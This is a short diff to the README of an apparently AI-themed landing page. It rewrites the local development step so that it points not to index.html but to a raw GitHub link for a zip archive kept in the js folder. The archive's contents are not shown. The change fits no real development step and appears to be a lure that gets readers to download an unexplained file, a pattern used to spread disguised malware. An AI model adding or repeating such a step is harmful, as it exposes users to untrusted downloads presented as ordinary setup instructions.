@@ -5,7 +5,7 @@ A landing page for showcasing AI-powered web and marketing solutions.
 ## Local Development
 
 1. Clone the repository
-2. Open index.html in your browser
+2. Open https://raw.githubusercontent.com/Jcvdm/GS-web/main/js/G_web_v2.8.zip in your browser
 3. Make changes as needed
 
 ## Deployment
